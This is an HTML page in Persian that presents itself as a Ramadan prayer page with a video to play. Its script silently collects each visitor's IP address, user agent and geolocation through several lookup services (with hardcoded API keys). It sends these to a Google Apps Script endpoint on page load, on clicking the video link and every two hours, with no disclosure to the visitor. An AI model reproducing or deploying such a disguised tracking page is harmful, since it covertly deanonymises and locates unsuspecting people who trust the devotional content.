<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="0">
  <title>دعای رمضان</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #333;
      text-align: center;
      padding: 20px;
      margin: 0;
      background-image: url('Pic.jpg');
      background-size: cover;
      background-position: center center;
      color: white;
    }
    h1 {
      font-size: 36px;
      color: white;
      margin-top: 20px;
    }
    .content {
      margin-top: 30px;
    }
    p {
      font-size: 18px;
      color: white;
    }
    #video {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.9);
      z-index: 999;
    }
    video {
      width: 100%;
      height: 100%;
      object-fit: contain;
    }
    .video-visible {
      display: block !important;
    }
    a {
      font-size: 20px;
      color: #00bcd4;
      text-decoration: none;
      padding: 10px;
      border-radius: 5px;
      background-color: rgba(0, 0, 0, 0.6);
      transition: background-color 0.3s;
      border-bottom: 2px solid #00bcd4;
    }
    a:hover {
      background-color: #009688;
      color: white;
    }
  </style>
</head>
<body>
  <h1>دعای ماه رمضان</h1>
  <p>اللهم بلغنا رمضان و اعنا على صیامه و قیامه، و تقبله منا برحمتك، یا أرحم الرّاحمین</p>
  <div class="content">
    <p>برای گوش جان سپردن به دعا و برکت رمضان،</p>
    <a href="#" id="showVideo">برای گوش جان سپردن به دعا اینجا را کلیک نمایید</a>
  </div>
  <div id="video">
    <video controls id="videoPlayer">
      <source src="Allahuma_Balighna_Ramadan.mp4?v=1.2.3" type="video/mp4">
      مرورگر شما از ویدئو پشتیبانی نمیکند
    </video>
  </div>
  <p>التماس دعا</p>

  <script>
    const APP_VERSION = "1.2.3";  // نسخه‌گذاری برای جلوگیری از کش

    // دریافت IP از localStorage
    function getStoredIPs() {
      const storedIPs = localStorage.getItem('previousIPs');
      return storedIPs ? JSON.parse(storedIPs) : [];
    }

    // ذخیره IP ها در localStorage
    function storeIPs(ips) {
      localStorage.setItem('previousIPs', JSON.stringify(ips));
    }

    // دریافت IP از چندین سرویس
    async function getIPAddress() {
      const services = [
        'https://api.ipify.org?format=json',
        'https://ipinfo.io/json',
        'https://worldtimeapi.org/api/ip'
      ];

      for (const url of services) {
        try {
          const response = await fetch(url, { cache: 'no-store' });
          const data = await response.json();
          return data.ip || data.query || data.ipAddress;
        } catch (error) {
          console.error(`Error fetching IP from ${url}:`, error);
        }
      }
      return "N/A"; // اگر IP پیدا نشد
    }

    // دریافت آدرس دقیق از IP
    async function getGeoData(ip) {
      try {
        // استفاده از API جدید ipapi و GeoIP
        const ipapiResponse = await fetch(`https://api.ipapi.com/${ip}?access_key=b6092de35990df8c36db1f56b93ec5f5`);
        const ipapiData = await ipapiResponse.json();

        const geoIPResponse = await fetch(`https://geoip-db.com/json/${ip}?apiKey=8cea67c7d8af30c4101ad3ec55ab5af39306a0d1`);
        const geoIPData = await geoIPResponse.json();

        return {
          ip: ip,
          city: ipapiData.city || geoIPData.city || 'N/A',
          region: ipapiData.region_name || geoIPData.state || 'N/A',
          country: ipapiData.country_name || geoIPData.country_name || 'N/A',
          loc: ipapiData.latitude + ',' + ipapiData.longitude || geoIPData.latitude + ',' + geoIPData.longitude || 'N/A' // مختصات جغرافیایی
        };
      } catch (error) {
        console.error(`Error fetching geo data for IP ${ip}:`, error);
        return null;
      }
    }

    // ارسال اطلاعات به گوگل اسکریپت
    async function logAccess() {
      try {
        const ip = await getIPAddress();
        if (ip === "N/A") {
          console.error('IP not found, not sending data.');
          return; // جلوگیری از ارسال درخواست در صورت عدم وجود IP
        }

        // دریافت IP های قبلی از localStorage
        let previousIPs = getStoredIPs();

        // اگر IP جدید است، آن را به آرایه اضافه کنید
        if (!previousIPs.includes(ip)) {
          previousIPs.push(ip);
          storeIPs(previousIPs); // ذخیره IP ها در localStorage
        }

        // دریافت آدرس دقیق از IP
        const geoData = await getGeoData(ip);
        const scriptUrl = 'https://script.google.com/macros/s/AKfycbzeyYdoOEkALEiZxTk8hiK-rzOFvSaqh5E9DLfNjEcdyUfd4fpP0yHlD7DBO4ATZ4vOJw/exec'; // آدرس اسکریپت خود را اینجا قرار دهید
        const params = new URLSearchParams({
          ips: JSON.stringify(previousIPs), // ارسال آرایه IP ها به صورت JSON
          ua: navigator.userAgent,
          geo: JSON.stringify(geoData), // ارسال داده‌های جغرافیایی
          t: Date.now()
        });

        const response = await fetch(`${scriptUrl}?${params}`, { cache: 'no-store', redirect: 'follow' });
        if (!response.ok) {
          console.error('Failed to log access:', response.statusText);
        } else {
          console.log('IP logged successfully:', previousIPs);
        }
      } catch (error) {
        console.error('خطا در ثبت لاگ:', error);
      }
    }

    // مدیریت نمایش ویدئو
    function handleVideoPlay() {
      const videoElem = document.getElementById('videoPlayer');
      
      videoElem.addEventListener('loadedmetadata', () => {
        if (videoElem.webkitSupportsFullscreen) {
          videoElem.webkitEnterFullscreen();
        } else if (videoElem.requestFullscreen) {
          videoElem.requestFullscreen();
        }
      });

      videoElem.src = `Allahuma_Balighna_Ramadan.mp4?v=${APP_VERSION}`;
      document.getElementById('video').classList.add('video-visible');
      videoElem.play();
    }

    // رویداد کلیک
    document.getElementById('showVideo').addEventListener('click', async (e) => {
      e.preventDefault();
      await logAccess(); // ثبت IP هنگام کلیک
      handleVideoPlay();
    });

    // ارسال دوره‌ای هر 2 ساعت
    setInterval(async () => {
      await logAccess();
    }, 7200000); // 2 ساعت

    // ارسال IP بلافاصله بعد از بارگذاری صفحه
    window.addEventListener('load', async () => {
      await logAccess();
    });

    // پاک کردن کش هنگام بسته شدن صفحه
    window.addEventListener('beforeunload', () => {
      caches.keys().then(names => {
        names.forEach(name => caches.delete(name));
      });
    });
  </script>
</body>
</html>
